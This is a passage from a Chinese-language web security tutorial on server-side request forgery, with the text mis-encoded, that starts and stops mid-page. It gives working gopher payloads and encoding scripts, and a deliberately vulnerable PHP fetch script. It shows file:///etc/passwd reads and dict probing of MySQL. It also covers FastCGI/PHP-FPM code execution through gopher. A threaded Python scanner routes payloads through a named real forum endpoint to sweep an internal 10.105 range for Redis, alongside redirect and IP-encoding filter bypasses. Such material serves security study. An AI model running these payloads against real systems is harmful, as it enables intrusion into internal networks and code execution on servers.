href="#curl" class="headerlink" title="curl"></a>curl</h3><blockquote><p><strong>cURL</strong>æ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ã€‚</p><p>å®ƒçš„åå­—å°±æ˜¯å®¢æˆ·ç«¯ï¼ˆclientï¼‰çš„ URL å·¥å…·çš„æ„æ€ã€‚</p></blockquote><p><code>curl -v www.baidu.com</code></p><p>-vï¼šæ˜¾ç¤ºè¯·æ±‚å¤´å’Œå“åº”å¤´</p><p><img src="/../images/image-20220805214719676.png" alt="image-20220805214719676"></p><p><code>curl -V</code></p><p><img src="/../images/image-20220804184555137.png" alt="image-20220804184555137"></p><p>å¯ä»¥çœ‹åˆ°æ”¯æŒçš„åè®®å¦‚ä¸‹</p><table><thead><tr><th><strong>dict</strong></th><th><strong>file</strong></th><th><strong>ftp</strong></th><th><strong>pop3</strong></th><th><strong>pop3s</strong></th></tr></thead><tbody><tr><td><strong>ftos</strong></td><td><strong>gopher</strong></td><td><strong>gophers</strong></td><td><strong>rtmp</strong></td><td><strong>rtsp</strong></td></tr><tr><td><strong>http</strong></td><td><strong>https</strong></td><td><strong>imap</strong></td><td><strong>scp</strong></td><td><strong>sftp</strong></td></tr><tr><td><strong>imaps</strong></td><td><strong>ldap</strong></td><td><strong>ldaps</strong></td><td><strong>smb</strong></td><td><strong>smbs</strong></td></tr><tr><td><strong>smtp</strong></td><td><strong>smtps</strong></td><td><strong>telnet</strong></td><td><strong>tftp</strong></td><td><strong>mtt</strong></td></tr></tbody></table><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><blockquote><p>gopher åè®®æ˜¯ä¸€ä¸ªåœ¨http åè®®è¯ç”Ÿå‰ç”¨æ¥è®¿é—®Internet èµ„æºçš„åè®®å¯ä»¥ç†è§£ä¸ºhttp åè®®çš„å‰èº«æˆ–ç®€åŒ–ç‰ˆï¼Œæ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼Œå¯ä»¥å®ç°å¤šä¸ªæ•°æ®åŒ…æ•´åˆå‘é€ï¼Œç„¶ågopher æœåŠ¡å™¨å°†å¤šä¸ªæ•°æ®åŒ…æ†ç»‘ç€å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œè¿™å°±æ˜¯å®ƒçš„èœå•å“åº”ã€‚æ¯”å¦‚ä½¿ç”¨ä¸€æ¡gopher åè®®çš„curl å‘½ä»¤å°±èƒ½æ“ä½œmysql æ•°æ®åº“æˆ–å®Œæˆå¯¹redis çš„æ”»å‡»ç­‰ç­‰ã€‚</p></blockquote><p><img src="/../images/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.jpg" alt="img"></p><ul><li>å‘ç‚¹</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ curl gopher://localhost:2222/khaz%0atest%0ahaha </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ nc -lvp 2222</span><br><span class="line">listening on [any] 2222 ...</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 50546</span><br><span class="line">haz</span><br><span class="line">test</span><br><span class="line">haha</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°æ¥æ”¶åˆ°çš„æ¶ˆæ¯æ˜¯åˆ†è¡Œçš„ï¼Œè€Œä¸”ç¬¬ä¸€è¡Œåªæ¥æ”¶åˆ°äº†hazï¼Œkè¢«â€˜åƒæ‰â€™äº†ã€‚</p><p>æ‰€ä»¥åœ¨ä½¿ç”¨gopheråè®®æ—¶<strong>éœ€è¦åœ¨urlååŠ å…¥ä¸€ä¸ªä»»æ„å­—ç¬¦</strong>æ‰è¡Œã€‚</p><ul><li><p>get&#x2F;postè¯·æ±‚</p><blockquote><p>1ã€æ„é€ HTTPæ•°æ®åŒ…</p><p>2ã€URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a,<br>3ã€å‘é€gopheråè®®</p></blockquote><p>æ³¨æ„HTTPæ•°æ®åŒ…ä¸­å¿…é¡»è¦æœ‰ä¸‹é¢å››ä¸ªè¯·æ±‚å¤´</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: 192.168.244.128</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">  </span><br><span class="line">a=khaz</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è½¬æ¢è„šæœ¬</span></span><br><span class="line">uri = <span class="string">&#x27;/flag.php&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1:80&#x27;</span></span><br><span class="line">content = <span class="string">&#x27;key=90bb4d9d9946905d6d9d68358d7c0360&#x27;</span></span><br><span class="line">content_length = <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test =<span class="string">f&quot;&quot;&quot;POST <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">  Host: <span class="subst">&#123;host&#125;</span></span></span><br><span class="line"><span class="string">  Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  Content-Length: <span class="subst">&#123;content_length&#125;</span></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  <span class="subst">&#123;content&#125;</span>&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">first = urllib.parse.quote(test)<span class="comment">#urlç¼–ç </span></span><br><span class="line"></span><br><span class="line">second = first.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)<span class="comment"># \n â†’ \r\n</span></span><br><span class="line"></span><br><span class="line">third = urllib.parse.quote(second)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;gopher://&#123;&#125;/_&#x27;</span>.<span class="built_in">format</span>(host)+third+<span class="string">&quot;%0D%0A&quot;</span> <span class="comment">#gopheråè®®ä¼šåƒæ‰urlåé¢çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>  ä¾‹å­</p><ul><li>é€šè¿‡å‘½ä»¤å‘èµ·</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php kali</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20220805001153033.png" alt="image-20220805001153033"></p><ul><li><p>é€šè¿‡curlå‡½æ•°å‘èµ·â€“ä¸¤æ¬¡urlç¼–ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ssrf.php  windows</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„curlèµ„æº  </span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();  </span><br><span class="line">    <span class="comment">//è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);  </span><br><span class="line">    <span class="comment">//æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line">    <span class="comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨é€šè¿‡å‘½ä»¤å‘èµ·çš„payloadï¼ˆä¸€æ¬¡urlç¼–ç ï¼‰ï¼Œå‘ç°æ— å›æ˜¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220805142401807.png" alt="image-20220805142401807"></p><p>å†æ¬¡è¿›è¡Œurlç¼–ç åå‘é€ï¼Œå‘ç°æ˜¯å¯ä»¥å›æ˜¾çš„ã€‚</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.244</span>.<span class="number">128</span>%<span class="number">3</span>A80%<span class="number">2</span>F_POST%<span class="number">2520</span>%<span class="number">2</span>F1.php%<span class="number">2520</span>HTTP%<span class="number">2</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520192.168</span>.<span class="number">244.128</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">25206</span>%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Aa%<span class="number">253</span>Dkhaz%<span class="number">250</span>D%<span class="number">250</span>A</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20220805142614175.png" alt="image-20220805142614175"></p><h3 id="http-x2F-https"><a href="#http-x2F-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h3><p>æ¢æµ‹Web åº”ç”¨çš„ä¿¡æ¯æƒ…å†µ</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>è¯»å–æœ¬åœ°æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd    </span><br><span class="line">file:///etc/hosts     # è®°å½•æœ¬æœºçš„æˆ–å…¶ä»–ä¸»æœºçš„ipåŠå…¶å¯¹åº”ä¸»æœºå</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é«˜æƒé™</span></span><br><span class="line">file:///proc/net/arp  # è®°å½•ARPåè®®å†…å®¹ï¼Œé‡Œé¢æœ‰ä¸»æœºçš„ipå’Œmacåœ°å€</span><br><span class="line">file:///etc/network/interfaces # å¤§éƒ¨åˆ†ç½‘ç»œæ¥å£é…ç½®</span><br></pre></td></tr></table></figure><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>æ¢æµ‹ç«¯å£æœåŠ¡</p><p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p><blockquote><p>dict åè®®æ˜¯ä¸€ä¸ªåœ¨çº¿ç½‘ç»œå­—å…¸åè®®ï¼Œç”¨æ¥æ¶è®¾å­—å…¸æœåŠ¡çš„ã€‚</p><p>å®ƒæ˜¯åŸºäºTCPåè®®å¼€å‘çš„ï¼Œæ‰€ä»¥åƒ mysql çš„æœåŠ¡ï¼Œå› ä¸ºä¹Ÿæ˜¯åŸºäº tcp åè®®å¼€å‘ï¼Œæ‰€ä»¥ç”¨ dict åè®®çš„æ–¹å¼æ‰“å¼€èƒ½å¼ºè¡Œè¯»å–ä¸€äº› mysql æœåŠ¡çš„è¿”å›å†…å®¹</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;dict://localhost:3306&quot;</span>; <span class="comment">//3306ç«¯å£æ˜¯mysqlæœåŠ¡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">PS D:\phpstudy_pro\phpstudy_pro\WWW\test&gt; D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.<span class="number">3.4</span>nts/php.exe <span class="string">&quot;d:\phpstudy_pro\phpstudy_pro\WWW\test\2.php&quot;</span></span><br><span class="line"></span><br><span class="line">J</span><br><span class="line"><span class="number">5.7</span>.<span class="number">26</span>U<span class="string">&#x27;+I2J%mkwB&quot;M)7     Imysql_native_password!#08S01Got packets out of order</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°5.7.26å’Œmysql</p><p><img src="/../images/image-20220804195027985.png" alt="image-20220804195027985"></p><p>â€‹    </p><h2 id="åˆ©ç”¨æ¡ˆä¾‹"><a href="#åˆ©ç”¨æ¡ˆä¾‹" class="headerlink" title="åˆ©ç”¨æ¡ˆä¾‹"></a>åˆ©ç”¨æ¡ˆä¾‹</h2><h3 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list</a></p><p><a href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><ul><li>FPMæ˜¯ä»€ä¹ˆ</li></ul><blockquote><p>å½“æˆ‘ä»¬çš„webæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚phpæ–‡ä»¶çš„è¯·æ±‚æ—¶ï¼Œå°±è®©php-fpmæŠŠå…¶è§£é‡Š(ç¿»è¯‘)æˆhtmlæ ¼å¼çš„æ–‡ä»¶(äº‹å®ä¸Šphp-fpmæ­£æ˜¯å¹²è¿™ä¸ªäº‹çš„)ï¼Œç„¶åæˆ‘ä»¬çš„webæœåŠ¡å™¨å°†ç¿»è¯‘å‡ºæ¥çš„.htmlæ–‡ä»¶å‘ç»™æµè§ˆå™¨ã€‚</p><p>è€Œphp-fpmèƒ½å¤Ÿè¿›è¡Œç¿»è¯‘ä¾é çš„å°±æ˜¯Fastcgié€šä¿¡åè®®ã€‚</p></blockquote><p><img src="/../images/1612761214_6020c87ec0101f355f51a.png!small" alt="1612761214_6020c87ec0101f355f51a.png!small"></p><ul><li><p>æ¼æ´æˆå› </p><blockquote><p>PHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚</p><p>fastcgiåè®®ä¼ è¾“çš„æ•°æ®å…¶å®å°±æ˜¯PHPç¯å¢ƒå˜é‡çš„ä¸€éƒ¨åˆ†ã€‚</p><p>é€šè¿‡è®¾ç½®<code>auto_prepend_file = php://input</code>ä¸”<code>allow_url_include = On</code>ï¼Œç„¶åå°†æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨Bodyä¸­ï¼Œå³å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚</p></blockquote></li><li><p>ä½¿ç”¨æ¡ä»¶</p><blockquote><p>PHPæœåŠ¡å™¨å¼€å¯fastcgiçš„ç«¯å£9000</p><p>èƒ½å¤Ÿæ‰¾åˆ°PHPæœåŠ¡å™¨ä¸Šçš„phpæ–‡ä»¶</p></blockquote></li><li><p>åˆ©ç”¨</p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><ul><li><p>ç›‘å¬ç«¯å£ï¼š<code>nc -lvp 9000&gt;1.txt</code></p></li><li><p>ä½¿ç”¨expï¼š<code>python fpm.py -c &quot;payload&quot; -p 9000 127.0.0.1 phpæ–‡ä»¶è·¯å¾„</code></p></li><li><p>å°†ç”Ÿæˆçš„1.txtè¿›è¡ŒåŒurlç¼–ç ï¼š<code>python 1.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+s)</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨å¾—åˆ°çš„ç»“æœè¿›è¡Œæ”»å‡»</p><p><img src="/../images/image-20220805192301243.png" alt="image-20220805192301243"></p></li></ul></li></ul><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><ul><li>respåè®®ï¼Œæ¢è¡Œåˆ†å‰²&#x2F;x0a&#x2F;x0d</li><li>gopheråè®®å¯ä»¥æ„é€ æ•°æ®åŒ…</li><li>weblogicçš„CRLFæ³¨å…¥</li></ul><p><a href="https://www.cnblogs.com/sijidou/p/13681845.html">ssrfä¸gopherä¸redis - sijidou - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/qianxinggz/p/13405443.html">weblogicä»ssrfåˆ°redisè·å–shell - qianxinggz - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>[æ€»ç»“](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Request Forgery)</p><h2 id="é‡å®šå‘ç»•è¿‡"><a href="#é‡å®šå‘ç»•è¿‡" class="headerlink" title="é‡å®šå‘ç»•è¿‡"></a>é‡å®šå‘ç»•è¿‡</h2><p>python2è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests.packages.urllib3</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line">threads_count = <span class="number">20</span></span><br><span class="line">scheme = <span class="string">&#x27;dict&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">ip_block = <span class="string">&#x27;10.105&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WyWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,queue</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.queue.empty():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = self.queue.get_nowait()</span><br><span class="line">                content = requests.get(url, timeout=<span class="number">2.8</span>).content</span><br><span class="line">                <span class="built_in">print</span> url, <span class="string">&#x27;OPEN&#x27;</span>, <span class="built_in">len</span>(content)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):    </span><br><span class="line">        ip = <span class="string">&#x27;&#123;0&#125;.&#123;1&#125;.&#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(ip_block,c,d)</span><br><span class="line">        payload = <span class="string">&#x27;http://fuzz.wuyun.com/302.php?s=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            scheme=scheme,</span><br><span class="line">            ip=ip, </span><br><span class="line">            port=port</span><br><span class="line">            )</span><br><span class="line">        url = <span class="string">&quot;http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]&#123;payload&#125;[/img]&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            payload=payload)</span><br><span class="line">        queue.put(url)</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(threads_count):</span><br><span class="line">    threads.append(WyWorker(queue))</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>302.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ•°å­—ipåœ°å€"><a href="#æ•°å­—ipåœ°å€" class="headerlink" title="æ•°å­—ipåœ°å€"></a>æ•°å­—ipåœ°å€</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åè¿›åˆ¶:&quot;</span>.<span class="variable">$r</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å…«è¿›åˆ¶:0&quot;</span>.<span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åå…­è¿›åˆ¶:0x&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ipåœ°å€çœç•¥å½¢å¼"><a href="#ipåœ°å€çœç•¥å½¢å¼" class="headerlink" title="ipåœ°å€çœç•¥å½¢å¼"></a>ipåœ°å€çœç•¥å½¢å¼</h2><blockquote><p>å¯ä»¥çœç•¥ipåœ°å€ä¸­é—´çš„0</p><p>å¦‚127.1 &#x3D;&#x3D; 127.0.0.1</p></blockquote><p><img src="/../images/image-20230328171933107.png" alt="image-20230328171933107"></p><h2 id=""><a href="#" class="headerlink" title="@,#"></a>@,#</h2><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><p><a href="http://baidu.com@khaz.top/">http://baidu.com@khaz.top</a>  &#x3D;&gt;  <a href="http://khaz.top/">http://khaz.top</a></p><blockquote><p>åªè§£ææœ€åä¸€ä¸ª@åé¢çš„åŸŸå</p></blockquote><p><img src="/../images/image-20220504125707388.png" alt="image-20220504125707388"></p><p><a href="http://khaz.top/#baidu.com">http://khaz.top#baidu.com</a> &#x3D;&gt; <a href="http://khaz.top/">http://khaz.top</a></p><p><img src="/../images/image-20220504153148066.png" alt="image-20220504153148066"></p><h2 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h2><ul><li><p>çŸ¥é“åˆ›å®‡åœ¨çº¿</p><p><a href="http://ceye.io/dns-rebinding">http://ceye.io/dns-rebinding</a></p><p><img src="/../images/image-20230319151337356.png" alt="image-20230319151337356"></p><p><img src="/../images/image-20230319151322924.png" alt="image-20230319151322924"></p></li><li><p>åŒä¸€ä¸ªåŸŸåç»‘å®šä¸¤æ¡Aè®°å½•ã€‚è¿™æ ·è§£ææ˜¯éšæœºçš„ã€‚ </p><p>è‡ªå·±çš„æœåŠ¡å™¨ï¼š</p><p><img src="/../images/image-20220805221419076.png" alt="image-20220805221419076"></p><blockquote><p>éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œç¢°è¿æ°”ã€‚</p><p>å½“æœåŠ¡å™¨ç¬¬ä¸€æ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå¤–ç½‘ipï¼Œç¬¬äºŒæ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå†…ç½‘ipçš„æ—¶å€™æ”»å‡»å°±æˆåŠŸäº†</p></blockquote></li><li><p>è‡ªå»º</p><p><a href="https://xz.aliyun.com/t/7495#toc-6">https://xz.aliyun.com/t/7495#toc-6</a></p></li></ul><h2 id="æœ¬åœ°åœ°å€ä¸åŒå½¢å¼"><a href="#æœ¬åœ°åœ°å€ä¸åŒå½¢å¼" class="headerlink" title="æœ¬åœ°åœ°å€ä¸åŒå½¢å¼"></a>æœ¬åœ°åœ°å€ä¸åŒå½¢å¼</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipï¼š127.0.0.1 --&gt; 127ã€‚0ã€‚0ã€‚1</span><br><span class="line">åŸŸåï¼šlocalhost</span><br><span class="line">ipv6ï¼š</span><br></pre></td></tr></table></figure><h2 id="urlä¸­çš„unicodeæ¬ºéª—"><a href="#urlä¸­çš„unicodeæ¬ºéª—" class="headerlink" title="urlä¸­çš„unicodeæ¬ºéª—"></a>urlä¸­çš„unicodeæ¬ºéª—</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ 